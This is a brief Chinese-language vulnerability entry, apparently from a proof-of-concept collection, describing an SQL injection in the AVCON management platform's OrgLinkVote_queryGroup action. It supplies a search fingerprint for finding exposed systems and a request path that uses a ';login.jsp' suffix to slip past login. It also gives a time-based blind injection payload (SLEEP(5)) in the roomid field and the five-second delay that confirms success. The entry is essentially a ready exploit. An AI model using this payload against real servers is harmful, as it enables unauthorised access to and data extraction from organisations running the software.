# AVCON系统管理平台OrgLinkVote_queryGroup存在SQL注入漏洞

AVCON ｜ SQL注入 ｜ —
- **指纹**：`title="AVCON-点播管理平台"`
- **请求**：`POST /OrgLinkVote_queryGroup.action;login.jsp HTTP/1.1`

**Payload**
```
roomid=1'AND (SELECT 1940 FROM (SELECT(SLEEP(5)))apGG) AND 'zljh'='zljh
```
- **响应特征**：200 响应时间>=5s